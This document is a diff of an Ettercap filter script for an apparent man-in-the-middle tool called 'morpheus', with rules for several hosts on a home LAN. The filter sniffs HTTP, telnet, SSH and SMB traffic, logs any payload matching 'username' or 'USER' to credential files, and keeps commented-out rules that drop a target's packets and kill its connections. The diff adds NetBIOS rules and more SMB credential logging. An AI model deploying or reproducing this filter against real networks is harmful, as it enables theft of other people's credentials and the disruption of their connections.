@@ -26,53 +26,68 @@
 ##
 # from ME -> OUTSIDE
 if (ip.src == '192.168.1.67' && ip.proto == TCP && tcp.dst == 80) {
-  msg("[morpheus] host:192.168.1.67   [ -> ]  port:80 http ☆");
+  msg("[morpheus]  host:192.168.1.67   [ -> ]  port:80 http ☆");
         # log credentials into morpheus/logs/http_creds
         if (regex(DECODED.data, ".*username.*")) {
          log(DECODED.data, "./http_creds");
-         msg("[morpheus] |_ credentials found, logfile stored ✔\n");
+         msg("[morpheus]  | status: login detected!");
+         msg("[morpheus]  |_ credentials found, logfile stored ✔\n");
     }
 }
 if (ip.src == '192.168.1.67' && ip.proto == TCP && tcp.dst == 443) {
-  msg("[morpheus] host:192.168.1.67   [ -> ]  port:443 https ☆");
+  msg("[morpheus]  host:192.168.1.67   [ -> ]  port:443 https ☆");
+}
+if (ip.src == '192.168.1.67' && ip.proto == TCP && tcp.dst == 445) {
+  msg("[morpheus]  host:192.168.1.67   [ -> ]  port:445 netbios ☠");
 }
 if (ip.src == '192.168.1.67' && ip.proto == TCP && tcp.dst == 139) {
-  msg("[morpheus] host:192.168.1.67   [ -> ]  port:139 smb ☆");
+  msg("[morpheus]  host:192.168.1.67   [ -> ]  port:139 netbios ☠");
+}
+if (ip.src == '192.168.1.67' && ip.proto == UDP && udp.dst == 137) {
+  msg("[morpheus]  host:192.168.1.67   [ -> ]  port:137 netbios ☠");
 }
 if (ip.src == '192.168.1.67' && ip.proto == TCP && tcp.dst == 23) {
-  msg("[morpheus] host:192.168.1.67   [ -> ]  port:23 telnet ☆");
+  msg("[morpheus]  host:192.168.1.67   [ -> ]  port:23 telnet ☆");
         # log credentials into morpheus/logs/telnet_creds
         if (regex(DECODED.data, ".*username.*")) {
          log(DECODED.data, "./telnet_creds");
-         msg("[morpheus] |_ credentials found, logfile stored ✔\n");
+         msg("[morpheus]  | status: login detected!");
+         msg("[morpheus]  |_ credentials found, logfile stored ✔\n");
     }
 }
 if (ip.src == '192.168.1.67' && ip.proto == TCP && tcp.dst == 22) {
-  msg("[morpheus] host:192.168.1.67   [ -> ]  port:22 ssh ☆");
+  msg("[morpheus]  host:192.168.1.67   [ -> ]  port:22 ssh ☆");
         # log credentials into morpheus/logs/ssh_creds
         if (regex(DECODED.data, ".*username.*")) {
          log(DECODED.data, "./ssh_creds");
-         msg("[morpheus] |_ credentials found, logfile stored...\n");
+         msg("[morpheus]  | status: login detected!");
+         msg("[morpheus]  |_ credentials found, logfile stored...\n");
     }
 }
 
 
 ##
 # from OUTSIDE -> ME
-if (ip.dst == '192.168.1.67' && ip.proto == TCP && tcp.src == 443) {
-  msg("[morpheus] host:192.168.1.67   [ <- ]  port:443 https ☆");
-}
 if (ip.dst == '192.168.1.67' && ip.proto == TCP && tcp.src == 80) {
-  msg("[morpheus] host:192.168.1.67   [ <- ]  port:80 http ☆");
+  msg("[morpheus]  host:192.168.1.67   [ <- ]  port:80 http ☆");
+}
+if (ip.dst == '192.168.1.67' && ip.proto == TCP && tcp.src == 443) {
+  msg("[morpheus]  host:192.168.1.67   [ <- ]  port:443 https ☆");
+}
+if (ip.dst == '192.168.1.67' && ip.proto == TCP && tcp.src == 445) {
+  msg("[morpheus]  host:192.168.1.67   [ <- ]  port:445 netbios ☠");
+}
+if (ip.dst == '192.168.1.67' && ip.proto == UDP && udp.src == 137) {
+  msg("[morpheus]  host:192.168.1.67   [ -> ]  port:137 netbios ☠");
 }
 if (ip.dst == '192.168.1.67' && ip.proto == TCP && tcp.src == 139) {
-  msg("[morpheus] host:192.168.1.67   [ <- ]  port:139 smb ☆");
+  msg("[morpheus]  host:192.168.1.67   [ <- ]  port:139 netbios ☠");
 }
 if (ip.dst == '192.168.1.67' && ip.proto == TCP && tcp.src == 23) {
-  msg("[morpheus] host:192.168.1.67   [ <- ]  port:23 telnet ☆");
+  msg("[morpheus]  host:192.168.1.67   [ <- ]  port:23 telnet ☠");
 }
 if (ip.dst == '192.168.1.67' && ip.proto == TCP && tcp.src == 22) {
-  msg("[morpheus] host:192.168.1.67   [ <- ]  port:22 ssh ☆");
+  msg("[morpheus]  host:192.168.1.67   [ <- ]  port:22 ssh ☆");
 }
 
 
@@ -84,31 +99,32 @@ if (ip.dst == '192.168.1.67' && ip.proto == TCP && tcp.src == 22) {
 ##
 # from ANDROID -> OUTSIDE
 if (ip.src == '192.168.1.95' && ip.proto == TCP && tcp.dst == 80) {
-  msg("[morpheus] host:192.168.1.95   [ -> ]  port:80 http ☆");
+  msg("[morpheus]  host:192.168.1.95   [ -> ]  port:80 http ☆");
         # log credentials into morpheus/logs/http_creds
         if (regex(DECODED.data, ".*username.*")) {
          log(DECODED.data, "./http_creds");
-         msg("[morpheus] |_ credentials found, logfile stored ✔\n");
+         msg("[morpheus]  | status: login detected!");
+         msg("[morpheus]  |_ credentials found, logfile stored ✔\n");
     }
 }
 if (ip.src == '192.168.1.95' && ip.proto == TCP && tcp.dst == 443) {
-  msg("[morpheus] host:192.168.1.95   [ -> ]  port:443 https ☆");
+  msg("[morpheus]  host:192.168.1.95   [ -> ]  port:443 https ☆");
 }
 if (ip.src == '192.168.1.95' && ip.proto == TCP && tcp.dst == 139) {
-  msg("[morpheus] host:192.168.1.95   [ -> ]  port:139 smb ☆");
+  msg("[morpheus]  host:192.168.1.95   [ -> ]  port:139 netbios ☆");
 }
 
 
 ##
 # from OUTSIDE ->  ANDROID
-if (ip.dst == '192.168.1.95' && ip.proto == TCP && tcp.src == 443) {
-  msg("[morpheus] host:192.168.1.95   [ <- ]  port:443 https ☆");
-}
 if (ip.dst == '192.168.1.95' && ip.proto == TCP && tcp.src == 80) {
-  msg("[morpheus] host:192.168.1.95   [ <- ]  port:80 http ☆");
+  msg("[morpheus]  host:192.168.1.95   [ <- ]  port:80 http ☆");
+}
+if (ip.dst == '192.168.1.95' && ip.proto == TCP && tcp.src == 443) {
+  msg("[morpheus]  host:192.168.1.95   [ <- ]  port:443 https ☆");
 }
 if (ip.dst == '192.168.1.95' && ip.proto == TCP && tcp.src == 139) {
-  msg("[morpheus] host:192.168.1.95   [ <- ]  port:139 smb ☆");
+  msg("[morpheus]  host:192.168.1.95   [ <- ]  port:139 netbios ☆");
 }
 
 
@@ -120,37 +136,44 @@ if (ip.dst == '192.168.1.95' && ip.proto == TCP && tcp.src == 139) {
 ##
 # from GATEWAY -> OUTSIDE
 if (ip.src == '192.168.1.253' && ip.proto == TCP && tcp.dst == 80) {
-  msg("[morpheus] host:192.168.1.253  [ -> ]  port:80 http ☆");
+  msg("[morpheus]  host:192.168.1.253  [ -> ]  port:80 http ☆");
 }
 if (ip.src == '192.168.1.253' && ip.proto == TCP && tcp.dst == 443) {
-  msg("[morpheus] host:192.168.1.253  [ -> ]  port:443 https ☆");
+  msg("[morpheus]  host:192.168.1.253  [ -> ]  port:443 https ☆");
+}
+if (ip.src == '192.168.1.253' && ip.proto == TCP && tcp.dst == 445) {
+  msg("[morpheus]  host:192.168.1.253  [ -> ]  port:445 netbios ☠");
 }
 if (ip.src == '192.168.1.253' && ip.proto == TCP && tcp.dst == 139) {
-  msg("[morpheus] host:192.168.1.253  [ -> ]  port:139 smb ☆");
+  msg("[morpheus]  host:192.168.1.253  [ -> ]  port:139 netbios ☠");
         # log credentials into morpheus/logs/smb_creds
         if (regex(DECODED.data, ".*USER.*")) {
          log(DECODED.data, "./smb_creds");
-         msg("[morpheus] |_ credentials found, logfile stored ✔\n");
+         msg("[morpheus]  | status: login detected!");
+         msg("[morpheus]  |_ credentials found, logfile stored ✔\n");
     }
 }
 if (ip.src == '192.168.1.253' && ip.proto == UDP && udp.dst == 53) {
-  msg("[morpheus] host:192.168.1.253  [ -> ]  port:53 domain ☆");
+  msg("[morpheus]  host:192.168.1.253  [ -> ]  port:53 domain ☆");
 }
 
 
 ##
 # from OUTSIDE -> GATEWAY
+if (ip.dst == '192.168.1.253' && ip.proto == TCP && tcp.src == 80) {
+  msg("[morpheus]  host:192.168.1.253  [ <- ]  port:80 http ☆");
+}
 if (ip.dst == '192.168.1.253' && ip.proto == TCP && tcp.src == 443) {
-  msg("[morpheus] host:192.168.1.253  [ <- ]  port:443 https ☆");
+  msg("[morpheus]  host:192.168.1.253  [ <- ]  port:443 https ☆");
 }
 if (ip.dst == '192.168.1.253' && ip.proto == TCP && tcp.src == 445) {
-  msg("[morpheus] host:192.168.1.253  [ <- ]  port:445 smb ☆");
+  msg("[morpheus]  host:192.168.1.253  [ <- ]  port:445 netbios ☠");
 }
-if (ip.dst == '192.168.1.253' && ip.proto == TCP && tcp.src == 80) {
-  msg("[morpheus] host:192.168.1.253  [ <- ]  port:80 http ☆");
+if (ip.dst == '192.168.1.253' && ip.proto == TCP && tcp.src == 139) {
+  msg("[morpheus]  host:192.168.1.253  [ <- ]  port:139 netbios ☠");
 }
 if (ip.dst == '192.168.1.253' && ip.proto == UDP && udp.src == 53) {
-  msg("[morpheus] host:192.168.1.253  [ <- ]  port:53 domain ☆");
+  msg("[morpheus]  host:192.168.1.253  [ <- ]  port:53 domain ☆");
 }
 
 
@@ -162,44 +185,53 @@ if (ip.dst == '192.168.1.253' && ip.proto == UDP && udp.src == 53) {
 ##
 # from MODEM -> OUTSIDE
 if (ip.src == '192.168.1.254' && ip.proto == TCP && tcp.dst == 80) {
-  msg("[morpheus] host:192.168.1.254  [ -> ]  port:80 http ☆");
+  msg("[morpheus]  host:192.168.1.254  [ -> ]  port:80 http ☆");
 }
 if (ip.src == '192.168.1.254' && ip.proto == TCP && tcp.dst == 443) {
-  msg("[morpheus] host:192.168.1.254  [ -> ]  port:443 https ☆");
+  msg("[morpheus]  host:192.168.1.254  [ -> ]  port:443 https ☆");
 }
 if (ip.src == '192.168.1.254' && ip.proto == TCP && tcp.dst == 139) {
-  msg("[morpheus] host:192.168.1.254  [ -> ]  port:139 smb ☆");
+  msg("[morpheus]  host:192.168.1.254  [ -> ]  port:139 netbios ☠");
+        # log credentials into morpheus/logs/smb_creds
+        if (regex(DECODED.data, ".*USER.*")) {
+         log(DECODED.data, "./smb_creds");
+         msg("[morpheus]  | status: login detected!");
+         msg("[morpheus]  |_ credentials found, logfile stored ✔\n");
+    }
 }
 if (ip.src == '192.168.1.254' && ip.proto == UDP && udp.dst == 53) {
-  msg("[morpheus] host:192.168.1.254  [ -> ]  port:53 domain ☆");
+  msg("[morpheus]  host:192.168.1.254  [ -> ]  port:53 domain ☆");
 }
 if (ip.src == '192.168.1.254' && ip.proto == TCP && tcp.dst == 23) {
-  msg("[morpheus] host:192.168.1.254  [ -> ]  port:23 telnet ☆");
+  msg("[morpheus]  host:192.168.1.254  [ -> ]  port:23 telnet ☆");
 }
 if (ip.src == '192.168.1.254' && ip.proto == TCP && tcp.dst == 22) {
-  msg("[morpheus] host:192.168.1.254  [ -> ]  port:22 ssh ☆");
+  msg("[morpheus]  host:192.168.1.254  [ -> ]  port:22 ssh ☆");
 }
 
 
 ##
 # from OUTSIDE -> MODEM
+if (ip.dst == '192.168.1.254' && ip.proto == TCP && tcp.src == 80) {
+  msg("[morpheus]  host:192.168.1.254  [ <- ]  port:80 http ☆");
+}
 if (ip.dst == '192.168.1.254' && ip.proto == TCP && tcp.src == 443) {
-  msg("[morpheus] host:192.168.1.254  [ <- ]  port:443 https ☆");
+  msg("[morpheus]  host:192.168.1.254  [ <- ]  port:443 https ☆");
 }
 if (ip.dst == '192.168.1.254' && ip.proto == TCP && tcp.src == 445) {
-  msg("[morpheus] host:192.168.1.254  [ <- ]  port:445 smb ☆");
+  msg("[morpheus]  host:192.168.1.254  [ <- ]  port:445 netbios ☠");
 }
-if (ip.dst == '192.168.1.254' && ip.proto == TCP && tcp.src == 80) {
-  msg("[morpheus] host:192.168.1.254  [ <- ]  port:80 http ☆");
+if (ip.dst == '192.168.1.254' && ip.proto == TCP && tcp.src == 139) {
+  msg("[morpheus]  host:192.168.1.254  [ <- ]  port:139 netbios ☠");
 }
 if (ip.dst == '192.168.1.254' && ip.proto == UDP && udp.src == 53) {
-  msg("[morpheus] host:192.168.1.254  [ <- ]  port:53 domain ☆");
+  msg("[morpheus]  host:192.168.1.254  [ <- ]  port:53 domain ☆");
 }
 if (ip.dst == '192.168.1.254' && ip.proto == TCP && tcp.src == 23) {
-  msg("[morpheus] host:192.168.1.254  [ <- ]  port:23 telnet ☆");
+  msg("[morpheus]  host:192.168.1.254  [ <- ]  port:23 telnet ☠");
 }
 if (ip.dst == '192.168.1.254' && ip.proto == TCP && tcp.src == 22) {
-  msg("[morpheus] host:192.168.1.254  [ <- ]  port:22 ssh ☆");
+  msg("[morpheus]  host:192.168.1.254  [ <- ]  port:22 ssh ☆");
 }
 
 
@@ -219,10 +251,10 @@ if (ip.dst == '192.168.1.254' && ip.proto == TCP && tcp.src == 22) {
 # "remmenber to change this ip addr for your target ip addr".
 #
 #if (ip.src == '192.168.1.95' || ip.dst == '192.168.1.95') {
-# msg("[morpheus] host:192.168.1.95   [ <> ]  found...");
-# msg("[morpheus] | status: block connection!");
-# msg("[morpheus] |  drop target tcp/udp packet ✔");
-# msg("[morpheus] |_ kill target tcp/udp connection ✔\n");
+# msg("[morpheus]  host:192.168.1.95   [ <> ]  found...");
+# msg("[morpheus]  | status: block connection!");
+# msg("[morpheus]  |  drop target tcp/udp packet ✔");
+# msg("[morpheus]  |_ kill target tcp/udp connection ✔\n");
 # drop();
 # drop();
 #kill();
@@ -237,10 +269,10 @@ if (ip.dst == '192.168.1.254' && ip.proto == TCP && tcp.src == 22) {
 # "remmenber to change this ipv6 addr for your target ipv6 addr".
 #
 #if (eth.proto == IP6 && ipv6.src == 'fe80::4b15:11c8:f426:205f' || ipv6.dst == 'fe80::4b15:11c8:f426:205f') {
-# msg("[morpheus] host:fe80::4b15..   [ <> ]  found...");
-# msg("[morpheus] | status: block connection!");
-# msg("[morpheus] |  drop target IPv6 tcp/udp packet ✔");
-# msg("[morpheus] |_ kill target IPv6 connection ✔\n");
+# msg("[morpheus]  host:fe80::4b15..   [ <> ]  found...");
+# msg("[morpheus]  | status: block connection!");
+# msg("[morpheus]  |  drop target IPv6 tcp/udp packet ✔");
+# msg("[morpheus]  |_ kill target IPv6 connection ✔\n");
 # drop();
 # drop();
 #kill();
